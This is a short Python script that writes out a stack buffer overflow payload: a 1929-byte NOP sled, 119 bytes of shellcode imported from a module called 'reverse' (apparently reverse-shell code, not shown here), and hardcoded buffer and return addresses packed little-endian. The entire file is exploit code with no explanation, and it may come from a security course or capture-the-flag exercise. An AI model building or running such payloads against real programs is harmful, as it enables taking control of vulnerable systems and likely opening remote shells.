import sys
import struct
from reverse import reverse

r_address=0xfffe720c
nops = b'\x90'*1929
operate_buffer = 0xffffcfeb
sys.stdout.buffer.write(struct.pack('1929s',nops) + struct.pack('119s',reverse) + struct.pack('<I',operate_buffer)+struct.pack('<I',r_address))
